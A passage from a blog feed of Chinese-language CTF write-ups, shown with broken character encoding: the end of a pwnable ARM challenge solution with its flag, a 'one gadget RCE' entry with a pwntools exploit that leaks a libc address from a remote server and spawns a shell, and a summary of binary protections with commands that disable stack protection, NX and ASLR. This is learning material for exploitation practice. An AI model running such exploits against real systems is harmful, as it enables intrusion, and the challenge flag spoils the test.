&lt;+24&gt;:bxlr</span><br></pre></td></tr></table></figure>pcä¸ºè¿”å›å€¼ï¼Œåœ¨æ‰§è¡Œåˆ°mov r3,pcæ—¶ï¼ŒPCçš„å€¼ä¸º0x8cdc+8ï¼Œå³0x8ce4ã€‚    </li><li>*key2**<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:push&#123;r6&#125;; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:addr6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:bxr6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:movr3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:addsr3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:push&#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:pop&#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:pop&#123;r6&#125;; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:movr0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:bxlr</span><br></pre></td></tr></table></figure>è¿›è¡Œäº†armåˆ°thumbçš„åˆ‡æ¢ï¼Œå…¶ä¸­add r6ï¼Œpc #1åªæ˜¯ä¸ºäº†è·³è½¬åˆ°thumbï¼Œè·³è½¬ä¹‹ååœ°å€å¹¶æ²¡æœ‰åŠ ä¸€ã€‚å½“æ‰§è¡Œåˆ°mov r3,pcæ—¶ï¼ŒPCçš„å€¼ä¸º0x8d04+4ï¼Œå³0x8d08ï¼Œåé¢å†åŠ ä¸Š4å¾—åˆ°è¿”å›å€¼ä¸º0x8d0cã€‚</li><li>*key3**<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:push&#123;r11&#125;; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:addr11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:movr3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:movr0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:subsp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:pop&#123;r11&#125;; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:bxlr</span><br></pre></td></tr></table></figure>å°†lrçš„å€¼ä½œä¸ºè¿”å›å€¼ï¼Œlrçš„å€¼ä¸ºè°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:bl0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:movr3, r0</span><br></pre></td></tr></table></figure>key3è¿”å›å€¼ä¸º0x8d80ã€‚æ‰€æœ‰è¿”å›å€¼ç›¸åŠ å¾—åˆ° 0x8ce4 + 0x8d0c + 0x8d80 =  108400<br>æœ€ç»ˆflagæ˜¯ <strong>My daddy has a lot of ARMv5te muscle!</strong></li></ul><p>è‡³æ­¤åˆ·å®Œç¬¬ä¸€æ’ï¼Œå‘ç°å‰é¢çš„é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚æ˜å¤©é™¤å¤• å…ˆç¥ç¦å¤§å®¶æ–°å¹´å¿«ä¹ æˆ‘ä¹Ÿé¡ºä¾¿äº‰å–æ˜å¤©åˆ·å®Œç¬¬ä¸€é˜¶æ¢¯çš„é¢˜ç›®ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>One gadget rce</title>
      <link href="one-gadget-rce.html"/>
      <url>one-gadget-rce.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>An execve([â€œ/bin/shâ€]) gadget,or similar,would be useful</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-01.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-02.png"></a></p><p>ä¸Šé¢ä¸¤å›¾ï¼Œæ˜¯æˆ‘åœ¨è°·æ­Œå­¦ä¹ çš„æ—¶å€™æœåˆ°çš„å†…å®¹ï¼Œåœ¨æˆ‘çš„ç†è§£ä¸­ï¼Œå°±æ˜¯åœ¨linuxä¸‹ï¼ŒæŸäº›libcä¸­æœ‰ä¸€ä¸ªåœ°å€ï¼Œä¸Šé¢çš„å†…å®¹æ˜¯execve([â€œ/bin/shâ€]),è¿™æ„å‘³ç€ï¼Œå¦‚æœæˆ‘èƒ½æº¢å‡ºï¼Œå¹¶è¦†ç›–åˆ°è¿™ä¸ªgadgetçš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘å¾ˆå®¹æ˜“å°±å¯ä»¥getshelläº†ã€‚</p><p>åœ¨IDAä¸­ï¼Œæˆ‘ä»¬é€šè¿‡æœç´¢å­—ç¬¦ä¸²ï¼Œ/bin/shå¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å›¾çš„å†…å®¹ï¼Œè¿™å°±æ˜¯one gadget rceï¼Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/one-gadget-03.png"></a></p><p>ä»æ±‡ç¼–æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä»–çš„åœ°å€<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-02.png"></a></p><p>ä¸Šæ–‡ï¼Œæˆ‘ä»¬å¾—çŸ¥äº†ä¸€ä¸ªgetshellçš„å°æŠ€å·§ï¼Œç°åœ¨ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹é¢˜ç›®ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/onegadget-03.png"></a><br>æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œé¦–å…ˆï¼Œå‘é€ï¼Œæˆ‘ä»¬éœ€è¦å»leakçš„åœ°å€çš„gotï¼Œprintfä¼šå¸®æˆ‘ä»¬è¯»åˆ°ä»–çš„åœ°å€ï¼Œä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦å–å€¼ï¼Œç„¶åå»leak one gadget rceï¼Œè®¡ç®—ä»–åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå°±èƒ½getshelläº†ã€‚<br>expå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">puts_addr = <span class="number">0x000000000006FD60</span></span><br><span class="line">binsh_addr = <span class="number">0x00000000000E66BD</span></span><br><span class="line">r = remote(<span class="string">&quot;59.110.6.128&quot;</span>, <span class="number">10086</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = process(&quot;./oneshot&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendline(str(<span class="number">0x600AD8</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Value: &quot;</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">&quot;\n&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">puts_addr = int(data,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;[*] puts addr:&#123;0&#125;&quot;</span>.format(hex(puts_addr))</span><br><span class="line">one_shot_rce = puts_addr - <span class="number">0x00000000006fd60</span> + <span class="number">0x00000000000E66BD</span>  <span class="comment">#one gadget rce addr </span></span><br><span class="line">r.sendline(str(one_shot_rce))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://www.yumpu.com/en/document/view/37809267/dragons-ctf/37">https://www.yumpu.com/en/document/view/37809267/dragons-ctf/37</a><br>é¢˜ç›®é“¾æ¥ï¼š<br><a href="http://pan.baidu.com/s/1qYjMJVY">http://pan.baidu.com/s/1qYjMJVY</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> one_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>checksecä»¥åŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶</title>
      <link href="Checksec-and-the-protection-mechanisms-it-contains.html"/>
      <url>Checksec-and-the-protection-mechanisms-it-contains.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶"><a href="#checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶" class="headerlink" title="checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶"></a>checksecåŠå…¶åŒ…å«çš„ä¿æŠ¤æœºåˆ¶</h2><p>ä»Šå¤©ç”±äºç¼–è¯‘ç¨‹åºçš„æ—¶å€™ï¼Œè€æ˜¯ä¸çŸ¥é“æ€ä¹ˆåªå¼€å¯è‡ªå·±æƒ³è¦çš„ä¿æŠ¤ï¼Œæ‰€ä»¥ç¨å¾®æŸ¥é˜…äº†ä¸€äº›èµ„æ–™ã€‚<br>å®‰å…¨æœºåˆ¶åŒ…æ‹¬DEPã€ASLRç­‰ã€‚åœ¨ç¼–å†™æ¼æ´åˆ©ç”¨ä»£ç çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ç›®æ ‡è¿›ç¨‹æ˜¯å¦å¼€å¯äº†DEPï¼ˆLinuxä¸‹å¯¹åº”NXï¼‰ã€ASLRï¼ˆLinuxä¸‹å¯¹åº”PIEï¼‰ç­‰æœºåˆ¶ï¼Œä¾‹å¦‚å­˜åœ¨DEPï¼ˆNXï¼‰çš„è¯å°±ä¸èƒ½ç›´æ¥æ‰§è¡Œæ ˆä¸Šçš„æ•°æ®ï¼Œå­˜åœ¨ASLRçš„è¯å„ä¸ªç³»ç»Ÿè°ƒç”¨çš„åœ°å€å°±æ˜¯éšæœºåŒ–çš„ã€‚</p><h2 id="ä¸€ã€checksec"><a href="#ä¸€ã€checksec" class="headerlink" title="ä¸€ã€checksec"></a>ä¸€ã€checksec</h2><p>checksecæ˜¯ä¸€ä¸ªè„šæœ¬è½¯ä»¶ï¼Œä¹Ÿå°±æ˜¯ç”¨è„šæœ¬å†™çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸åˆ°2000è¡Œï¼Œå¯ç”¨æ¥å­¦ä¹ shellã€‚<br>æºç ä¸‹è½½åœ°å€ï¼š<br><a href="http://www.trapkit.de/tools/checksec.html">http://www.trapkit.de/tools/checksec.html</a><br><a href="https://github.com/slimm609/checksec.sh/">https://github.com/slimm609/checksec.sh/</a><br>ä¸‹è½½åœ°å€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</span><br></pre></td></tr></table></figure><h3 id="ç”¨é€”ï¼š"><a href="#ç”¨é€”ï¼š" class="headerlink" title="ç”¨é€”ï¼š"></a>ç”¨é€”ï¼š</h3><p>å®ƒæ˜¯ç”¨æ¥æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚PIE, RELRO, PaX, Canaries, ASLR, Fortify Sourceç­‰ç­‰å±æ€§ã€‚</p><h3 id="ä½¿ç”¨æ–¹æ³•ï¼š"><a href="#ä½¿ç”¨æ–¹æ³•ï¼š" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ï¼š"></a>ä½¿ç”¨æ–¹æ³•ï¼š</h3><p>checksecçš„ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec â€“file /usr/sbin/sshd</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯å­¦ä¹ äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨çš„æœ‹å‹ï¼Œå»ºè®®å¤§å®¶ä½¿ç”¨gdbé‡Œpedaæ’ä»¶é‡Œè‡ªå¸¦çš„checksecåŠŸèƒ½ï¼Œå¦‚ä¸‹ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/checksec.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/checksec.png"></a></p><h2 id="äºŒã€CANNARY-æ ˆä¿æŠ¤"><a href="#äºŒã€CANNARY-æ ˆä¿æŠ¤" class="headerlink" title="äºŒã€CANNARY(æ ˆä¿æŠ¤)"></a>äºŒã€CANNARY(æ ˆä¿æŠ¤)</h2><p>è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚<br>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚<br>gccåœ¨4.2ç‰ˆæœ¬ä¸­æ·»åŠ äº†-fstack-protectorå’Œ-fstack-protector-allç¼–è¯‘å‚æ•°ä»¥æ”¯æŒæ ˆä¿æŠ¤åŠŸèƒ½ï¼Œ4.9æ–°å¢äº†-fstack-protector-strongç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿ã€‚<br>å› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  //ç¦ç”¨æ ˆä¿æŠ¤</span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c   //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c //å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€FORTIFY"><a href="#ä¸‰ã€FORTIFY" class="headerlink" title="ä¸‰ã€FORTIFY"></a>ä¸‰ã€FORTIFY</h2><p>è¿™ä¸ªä¿æŠ¤æœºåˆ¶æŸ¥äº†å¾ˆä¹…éƒ½æ²¡æœ‰ä¸ªå¾ˆå¥½çš„æ±‰è¯­å½¢å®¹ï¼Œæ ¹æ®æˆ‘çš„ç†è§£å®ƒå…¶å®å’Œæ ˆä¿æŠ¤éƒ½æ˜¯gccçš„æ–°çš„ä¸ºäº†å¢å¼ºä¿æŠ¤çš„ä¸€ç§æœºåˆ¶ï¼Œé˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ã€‚ç”±äºå¹¶ä¸æ˜¯å¤ªå¸¸è§ï¼Œä¹Ÿæ²¡æœ‰å¤ªå¤šçš„äº†è§£ã€‚<br>ä¸¾ä¸ªä¾‹å­å¯èƒ½ç®€å•æ˜äº†ä¸€äº›ï¼š<br>ä¸€æ®µç®€å•çš„å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„Cä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, s);</span><br><span class="line">        <span class="comment">/* Don&#x27;t allow gcc to optimise away the buf */</span></span><br><span class="line">        <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> :: <span class="string">&quot;m&quot;</span> (buf))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨åŒ…å«å‚æ•°-U_FORTIFY_SOURCEç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; å°†0x118å­˜å‚¨åˆ°æ ˆä¸Š</span><br><span class="line">  mov    0x8(%ebp),%eax     ; å°†ç›®æ ‡å‚æ•°è½½å…¥eax</span><br><span class="line">  mov    %eax,0x4(%esp)     ; ä¿å­˜ç›®æ ‡å‚æ•°</span><br><span class="line">  lea    -0x108(%ebp),%eax  ; æ•°ç»„buf</span><br><span class="line">  mov    %eax,(%esp)        ; ä¿å­˜</span><br><span class="line">  call   8048320 &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                     ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>ç”¨åŒ…å«å‚æ•°-D_FORTIFY_SOURCE=2ç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">08048470 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; </span><br><span class="line">  movl   $0x100,0x8(%esp)   ; æŠŠ0x100å½“ä½œç›®æ ‡å‚æ•°ä¿å­˜</span><br><span class="line">  mov    0x8(%ebp),%eax     ; </span><br><span class="line">  mov    %eax,0x4(%esp)     ; </span><br><span class="line">  lea    -0x108(%ebp),%eax  ; </span><br><span class="line">  mov    %eax,(%esp)        ; </span><br><span class="line">  call   8048370 &lt;__strcpy_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                      ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°gccç”Ÿæˆäº†ä¸€äº›é™„åŠ ä»£ç ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°çš„åˆ¤æ–­æ›¿æ¢strcpy, memcpy, memsetç­‰å‡½æ•°åï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚</p><h2 id="å››ã€NXï¼ˆDEPï¼‰"><a href="#å››ã€NXï¼ˆDEPï¼‰" class="headerlink" title="å››ã€NXï¼ˆDEPï¼‰"></a>å››ã€NXï¼ˆDEPï¼‰</h2><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤</p><p>gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚<br>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure><p>åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚</p><h2 id="äº”ã€PIEï¼ˆASLRï¼‰"><a href="#äº”ã€PIEï¼ˆASLRï¼‰" class="headerlink" title="äº”ã€PIEï¼ˆASLRï¼‰"></a>äº”ã€PIEï¼ˆASLRï¼‰</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚</span><br><span class="line">1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚</span><br><span class="line">2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚</span><br></pre></td></tr></table></figure><p>å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚<br>Built as PIEï¼šä½ç½®ç‹¬ç«‹çš„å¯æ‰§è¡ŒåŒºåŸŸï¼ˆposition-independent executablesï¼‰ã€‚è¿™æ ·ä½¿å¾—åœ¨åˆ©ç”¨ç¼“å†²æº¢å‡ºå’Œç§»åŠ¨æ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„å…¶ä»–å†…å­˜å´©æºƒç¼ºé™·æ—¶é‡‡ç”¨é¢å‘è¿”å›çš„ç¼–ç¨‹ï¼ˆreturn-oriented programmingï¼‰æ–¹æ³•å˜å¾—éš¾å¾—å¤šã€‚<br>liunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>å•ç‹¬å…³æ‰</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRFåˆæ¢</title>
      <link href="CSRF-Preliminary-Study.html"/>
      <url>CSRF-Preliminary-Study.html</url>
      
